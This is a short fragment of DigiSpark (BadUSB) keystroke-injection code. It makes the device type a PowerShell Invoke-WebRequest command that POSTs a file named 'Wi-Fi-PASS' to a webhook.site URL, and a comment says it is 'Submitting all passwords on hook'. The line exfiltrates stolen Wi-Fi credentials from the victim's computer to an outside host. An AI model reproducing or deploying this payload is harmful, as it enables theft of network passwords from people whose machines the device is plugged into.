...
void loop() {
  ...
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/cbc4baba-3dde-4cf6-9929-8e9e80e2cb59 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
